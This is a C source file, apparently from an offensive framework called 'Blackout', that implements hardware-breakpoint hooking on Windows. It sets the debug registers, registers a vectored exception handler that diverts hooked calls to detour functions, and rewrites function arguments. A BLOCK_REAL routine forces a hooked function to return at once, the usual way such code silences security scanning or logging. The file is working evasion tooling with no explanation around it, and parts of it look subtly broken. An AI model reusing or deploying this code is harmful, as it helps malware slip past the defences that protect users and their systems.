#include <common.h>
#include <evasion.h>

FUNC UINT64 SetDr7Bits(
    UINT64 CurrentDr7Register, 
    UINT32 StartingBitPosition, 
    UINT32 NmbrOfBitsToModify, 
    UINT64 NewBitValue
) {
	UINT64 mask           = ( 1UL << NmbrOfBitsToModify ) - 1UL;
	UINT64 NewDr7Register = ( CurrentDr7Register & ~( mask << StartingBitPosition ) ) | ( NewBitValue << StartingBitPosition );

	return NewDr7Register;
}

FUNC BOOL SetHwbp(
    PVOID pAddress, 
    PVOID fnHookFunc, 
    DRX   Drx
) {
    BLACKOUT_INSTANCE

	if (!pAddress || !fnHookFunc)
		return FALSE;

	CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

	// Get local thread context
	Instance()->Win32.NtGetContextThread( NtCurrentThread(), &ThreadCtx );

	// Sets the value of the Dr0-3 registers 
	switch ( Drx ) {
		case Dr0: {
			if ( !ThreadCtx.Dr0 )
				ThreadCtx.Dr0 = pAddress;
			break;
		}
		case Dr1: {
			if ( !ThreadCtx.Dr1 )
				ThreadCtx.Dr1 = pAddress;
			break;
		}
		case Dr2: {
			if ( !ThreadCtx.Dr2 )
				ThreadCtx.Dr2 = pAddress;
			break;
		}
		case Dr3: {
			if ( !ThreadCtx.Dr3 )
				ThreadCtx.Dr3 = pAddress;
			break;
		}
		default:
			return FALSE;
	}

    Blackout().Hwbp.DetourFunc[Drx] = fnHookFunc;

	ThreadCtx.Dr7 = SetDr7Bits( ThreadCtx.Dr7, ( Drx * 2 ), 1, 1);
	// Set the thread context
	Instance()->Win32.NtSetContextThread( NtCurrentThread(), &ThreadCtx );

	return TRUE;
}

FUNC BOOL RmvHwbp( 
    DRX Drx
) {
    BLACKOUT_INSTANCE

	CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

	Instance()->Win32.NtGetContextThread( NtCurrentThread(), &ThreadCtx );

	// Remove the address of the hooked function from the thread context
	switch ( Drx ) {
		case Dr0: {
			ThreadCtx.Dr0 = 0x00;
			break;
		}
		case Dr1: {
			ThreadCtx.Dr1 = 0x00;
			break;
		}
		case Dr2: {
			ThreadCtx.Dr2 = 0x00;
			break;
		}
		case Dr3: {
			ThreadCtx.Dr3 = 0x00;
			break;
		}
		default:
			return FALSE;
	}

	// Disabling the hardware breakpoint by setting the target G0-3 flag to zero 
	ThreadCtx.Dr7 = SetDr7Bits( ThreadCtx.Dr7, (Drx * 2), 1, 0 );

    Instance()->Win32.NtSetContextThread( NtCurrentThread(), &ThreadCtx );

	return TRUE;
}

FUNC LONG WINAPI HwbpVectorHandler(
    PEXCEPTION_POINTERS pExceptionInfo
) {
    BLACKOUT_INSTANCE
	// If the exception is 'EXCEPTION_SINGLE_STEP'; then its caused by a breakpoint and we should handle it
	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {

		// Verify if the breakpoint is a hardware breakpoint we installed
		if (pExceptionInfo->ExceptionRecord->ExceptionAddress == pExceptionInfo->ContextRecord->Dr0 ||
			pExceptionInfo->ExceptionRecord->ExceptionAddress == pExceptionInfo->ContextRecord->Dr1 ||
			pExceptionInfo->ExceptionRecord->ExceptionAddress == pExceptionInfo->ContextRecord->Dr2 ||
			pExceptionInfo->ExceptionRecord->ExceptionAddress == pExceptionInfo->ContextRecord->Dr3) {

			DRX Drx = -1;
			// Defining a function pointer that accepts one parameter of type 'PCONTEXT'
			VOID (*fnHookFunc)(PCONTEXT) = NULL;

			// Detect the hw bp register (Dr0-3)
			if (pExceptionInfo->ExceptionRecord->ExceptionAddress == pExceptionInfo->ContextRecord->Dr0)
				Drx = Dr0;
			if (pExceptionInfo->ExceptionRecord->ExceptionAddress == pExceptionInfo->ContextRecord->Dr1)
				Drx = Dr1;
			if (pExceptionInfo->ExceptionRecord->ExceptionAddress == pExceptionInfo->ContextRecord->Dr2)
				Drx = Dr2;
			if (pExceptionInfo->ExceptionRecord->ExceptionAddress == pExceptionInfo->ContextRecord->Dr3)
				Drx = Dr3;

			// Disable hw breakpoint to allow execution the hooked function from the detour function 
			RmvHwbp( Drx );

			// Execute the callback (detour function)
			fnHookFunc = Blackout().Hwbp.DetourFunc[Drx];
			fnHookFunc( pExceptionInfo->ContextRecord );

			// Enable the hw breakpoint again
			SetHwbp( pExceptionInfo->ExceptionRecord->ExceptionAddress, Blackout().Hwbp.DetourFunc[Drx], Drx );

			// Continue the execution - The exception is handled
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}

	// The exception is not handled:					\
	- Not from the hardware breakpoints	!(Dr0-3)			\
	- The exception code is not 'EXCEPTION_SINGLE_STEP'

	return EXCEPTION_CONTINUE_SEARCH;
}

FUNC PBYTE GetFuncArg(
	PCONTEXT pThreadCtx,
	DWORD    dwParmIndex
) {

#ifdef _WIN64
	// the first 4 arguments in x64 are in the "RCX - RDX - R8 - R9" registers
	switch ( dwParmIndex ) {
	case 0x01:
		return (ULONG_PTR)pThreadCtx->Rcx;
	case 0x02:
		return (ULONG_PTR)pThreadCtx->Rdx;
	case 0x03:
		return (ULONG_PTR)pThreadCtx->R8;
	case 0x04:
		return (ULONG_PTR)pThreadCtx->R9;
	default:
		break;
	}

	// else more arguments are pushed to the stack
	return *(ULONG_PTR*)( pThreadCtx->Rsp + ( dwParmIndex * sizeof( PVOID ) ) );
#else
	return *(DWORD_PTR*)( pThreadCtx->Esp + ( dwParmIndex * sizeof( PVOID ) ) );
#endif // _WIN64

}

FUNC VOID SetFuncArg(
	PCONTEXT  pThreadCtx, 
	ULONG_PTR uValue, 
	DWORD  	  dwParmIndex
) {

#ifdef _WIN64

	// the first 4 arguments in x64 are in the "RCX - RDX - R8 - R9" registers
	switch (dwParmIndex) {
	case 0x01:
		pThreadCtx->Rcx = uValue; return;
	case 0x02:
		pThreadCtx->Rdx = uValue; return;
	case 0x03:
		pThreadCtx->R8  = uValue; return;
	case 0x04:
		pThreadCtx->R9  = uValue; return;
	default:
		break;
	}

	// else more arguments are pushed to the stack
	*(ULONG_PTR*)( pThreadCtx->Rsp + ( dwParmIndex * sizeof( PVOID ) ) ) = uValue;
#else
	*(DWORD_PTR*)( pThreadCtx->Esp + ( dwParmIndex * sizeof( PVOID ) ) ) = uValue;
#endif // _WIN64

}

FUNC BOOL InitHwbp(
	VOID
) {
	BLACKOUT_INSTANCE

	MmZero( &Blackout().Hwbp.CriticalSection, sizeof(CRITICAL_SECTION));
	MmZero( &Blackout().Hwbp.DetourFunc, sizeof( Blackout().Hwbp.DetourFunc ) );

	// If 'g_CriticalSection' is not yet initialized
	if ( Blackout().Hwbp.CriticalSection.DebugInfo == NULL ) {
		Instance()->Win32.RtlInitializeCriticalSection( &Blackout().Hwbp.CriticalSection );
	}

	// If 'g_VectorHandler' is not yet initialized
	if ( !Blackout().Hwbp.VectorHandle ) {
		// Add 'VectorHandler' as the VEH function
		if ( ( Blackout().Hwbp.VectorHandle = Instance()->Win32.RtlAddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)&HwbpVectorHandler) ) == NULL) 
			return;
	}

	return ( Blackout().Hwbp.VectorHandle && Blackout().Hwbp.CriticalSection.DebugInfo );
}

FUNC VOID UninitHwbp(
	VOID
) {
	BLACKOUT_INSTANCE

	for (int i = 0; i < 4; i++)
		RmvHwbp( i );
	// If the critical section is initialized, delete it
	if ( Blackout().Hwbp.CriticalSection.DebugInfo )
		Instance()->Win32.RtlDeleteCriticalSection( &Blackout().Hwbp.CriticalSection );
	// If VEH is registered, remove it
	if ( Blackout().Hwbp.VectorHandle )
		Instance()->Win32.RtlRemoveVectoredExceptionHandler( Blackout().Hwbp.VectorHandle );

	// Cleanup the global variables
	MmZero( &Blackout().Hwbp.CriticalSection, sizeof( CRITICAL_SECTION ) );
	MmZero( &Blackout().Hwbp.DetourFunc, sizeof( Blackout().Hwbp.DetourFunc ));
	Blackout().Hwbp.VectorHandle = NULL;
}

FUNC VOID BLOCK_REAL(
	PCONTEXT pThreadCtx
) {
	BYTE ucRet[1] = { 0xc3 };
#ifdef _WIN64
	pThreadCtx->Rip = (ULONG_PTR)&ucRet;
#elif _WIN32
	pThreadCtx->Eip = (DWORD)&ucRet;
#endif // _WIN64
}